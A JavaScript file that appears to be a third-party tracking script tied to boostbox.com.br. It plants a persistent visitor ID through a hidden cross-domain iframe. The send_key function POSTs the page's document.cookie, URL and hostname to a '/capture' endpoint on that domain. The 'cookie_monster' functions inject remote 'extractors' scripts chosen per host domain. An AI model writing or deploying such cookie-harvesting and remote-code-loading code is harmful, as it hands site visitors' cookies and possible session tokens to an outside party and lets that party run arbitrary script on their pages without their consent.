function add_cross_domain_local_storage() {
  /**
   * Created by dagan on 07/04/2014.
   */
  /* global console,  */
  window.xdLocalStorage = window.xdLocalStorage || (function() {
    var MESSAGE_NAMESPACE = 'cross-domain-local-message';
    var options = {
      iframeId: 'cross-domain-iframe',
      iframeUrl: undefined,
      initCallback: function() {}
    };
    var requestId = -1;
    var iframe;
    var requests = {};
    var wasInit = false;
    var iframeReady = true;

    function applyCallback(data) {
      if (requests[data.id]) {
        requests[data.id](data);
        delete requests[data.id];
      }
    }

    function receiveMessage(event) {
      var data;
      try {
        data = JSON.parse(event.data);
      } catch (err) {
        //not our message, can ignore
      }
      if (data && data.namespace === MESSAGE_NAMESPACE) {
        if (data.id === 'iframe-ready') {
          iframeReady = true;
          options.initCallback();
        } else {
          applyCallback(data);
        }
      }
    }

    function buildMessage(action, key, value, callback) {
      requestId++;
      requests[requestId] = callback;
      var data = {
        namespace: MESSAGE_NAMESPACE,
        id: requestId,
        action: action,
        key: key,
        value: value
      };
      iframe.contentWindow.postMessage(JSON.stringify(data), '*');
    }

    function init(customOptions) {
      if (wasInit) {
        return;
      }
      wasInit = true;
      options = XdUtils.extend(customOptions, options);
      var temp = document.createElement('div');

      if (window.addEventListener) {
        window.addEventListener('message', receiveMessage, false);
      } else {
        window.attachEvent('onmessage', receiveMessage);
      }

      temp.innerHTML = '<iframe id="' + options.iframeId + '" src=' + options.iframeUrl + ' style="display: none;"></iframe>';
      document.body.appendChild(temp);
      iframe = document.getElementById(options.iframeId);
    }

    function isApiReady() {
      if (!wasInit) {
        return false;
      }
      if (!iframeReady) {
        return false;
      }
      return true;
    }

    return {
      //callback is optional for cases you use the api before window load.
      init: function(customOptions) {
        if (!customOptions.iframeUrl) {
          throw 'You must specify iframeUrl';
        }
        if (document.readyState === 'complete') {
          init(customOptions);
        } else {
          window.onload = function() {
            init(customOptions);
          };
        }
      },
      setItem: function(key, value, callback) {
        if (!isApiReady()) {
          return;
        }
        buildMessage('set', key, value, callback);
      },

      getItem: function(key, callback) {
        if (!isApiReady()) {
          return;
        }
        buildMessage('get', key, null, callback);
      },
      removeItem: function(key, callback) {
        if (!isApiReady()) {
          return;
        }
        buildMessage('remove', key, null, callback);
      },
      key: function(index, callback) {
        if (!isApiReady()) {
          return;
        }
        buildMessage('key', index, null, callback);
      },
      clear: function(callback) {
        if (!isApiReady()) {
          return;
        }
        buildMessage('clear', null, null, callback);
      }
    };
  })();
}

function xd_utils() {
  window.XdUtils = window.XdUtils || (function() {

    function extend(object, defaultObject) {
      var result = defaultObject || {};
      var key;
      for (key in object) {
        if (object.hasOwnProperty(key)) {
          result[key] = object[key];
        }
      }
      return result;
    }

    //public interface
    return {
      extend: extend
    };
  })();
}

function random() {
  return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
}

function init_local_storage() {
  xd_utils();
  add_cross_domain_local_storage();
  xdLocalStorage.init({
    /* required */
    iframeUrl: '//www.boostbox.com.br/xd_local_storage',
    initCallback: function() {
      handle_key();
    }
  });
}

function send_key() {
  xdLocalStorage.getItem('cv-collector-id', function(data) {
    var data_ex = bb_extract_all;
    var data = {
      "localstorage_id": data.value,
      "cookie": document.cookie,
      "url": window.location.href,
      "host": window.location.hostname
    }

    data = window.jQuery.fn.extend({}, data, data_ex)
    window.jQuery.ajax({
      type: 'POST',
      data: data,
      async: true,
      url: '//www.boostbox.com.br/capture'
    });
  });
}

function get_key() {
  xdLocalStorage.getItem('cv-collector-id', function(data) {
    return data.value;
  });
}

function handle_key() {
  xdLocalStorage.getItem('cv-collector-id', function(data) {
    var key = data.value;
    //change key to new format if it is the old one
    if (!does_key_exist(key) || key.match(/-/)) {
      set_key();
      handle_key();
    } else {
      send_key();
      load_yahoo_tag();
    }
  });
}

function does_key_exist(key) {
  return !!key
}

function set_key() {
  key = random() + random() + random() + random() + random() + random() + random() + random() + random() + random() + random() + random() + random();
  xdLocalStorage.setItem('cv-collector-id', key);
}

var jQueryScriptOutputted = false;

function initJQuery() {
  //if the jQuery object isn't available
  if (typeof(jQuery) == 'undefined') {

    if (!jQueryScriptOutputted) {
      //only output the script once..
      jQueryScriptOutputted = true;

      //output the script (load it from google api)
      var container = document.getElementsByTagName('head');
      var content = document.createElement('script');
      content.src = 'https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js';
      content.type = 'text/javascript'
      container[0].appendChild(content)
    }
    setTimeout("initJQuery()", 10);
  } else {
    window.jQuery(document).ready(function(){
      add_cookie_monster();
      init_local_storage();
    });
  }
}

function bb_extract_all() {
}

function add_cookie_monster_test() {
  url = '//www.boostbox.com.br/extractors?test=true&domain=' + window.location.hostname;
  var cookiemonster = document.createElement('script');
  cookiemonster.setAttribute('src', url);
  document.head.appendChild(cookiemonster);
}

function add_cookie_monster() {
  url = '//www.boostbox.com.br/extractors?domain=' + window.location.hostname;
  var cookiemonster = document.createElement('script');
  cookiemonster.setAttribute('src', url);
  document.head.appendChild(cookiemonster);
}
add_cookie_monster();

initJQuery();
function load_yahoo_tag() {
  var container = document.getElementsByTagName('head');
  var yahooContent = document.createElement('script');
  yahooContent.src = '//cms.analytics.yahoo.com/cms?partner_id=FULL';
  container[0].appendChild(yahooContent);
}